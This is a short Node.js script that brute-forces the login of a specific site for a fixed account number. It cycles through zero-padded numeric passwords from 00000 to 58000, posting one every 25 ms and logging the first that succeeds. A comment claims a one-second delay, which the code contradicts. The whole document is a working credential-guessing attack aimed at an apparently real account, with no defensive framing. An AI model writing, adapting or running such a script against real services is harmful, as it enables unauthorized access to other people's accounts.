const axios = require("axios");

const baseUrl = "https://adslindo.tk";
const baseLogin = "20200017927";

let startingValue = "-1";
const baseLength = "00000";
let diffAdj;

const myLoop = setInterval(() => {
    startingValue = Number(startingValue) + 1;
    diffAdj = startingValue.toString();
    for (
        let i = 0;
        i < baseLength.length - startingValue.toString().length;
        i++
    )
        diffAdj = "0".concat(diffAdj);

    // Clear loop if overdue
    if (diffAdj === "58000") clearInterval(myLoop);

    axios({
        method: "post",
        url: baseUrl + "/login",
        data: {
            usuario: baseLogin,
            senha: diffAdj,
        },
    })
        .then((resp) => {
            console.log(`${resp.status} | Found: ${diffAdj}`);
            clearInterval(myLoop);
        })
        .catch((err) => {
            console.error(`nop ->  ${err.response.status} | ${diffAdj}`);
        });
}, 25); // 1 sec cus dont wanna spam
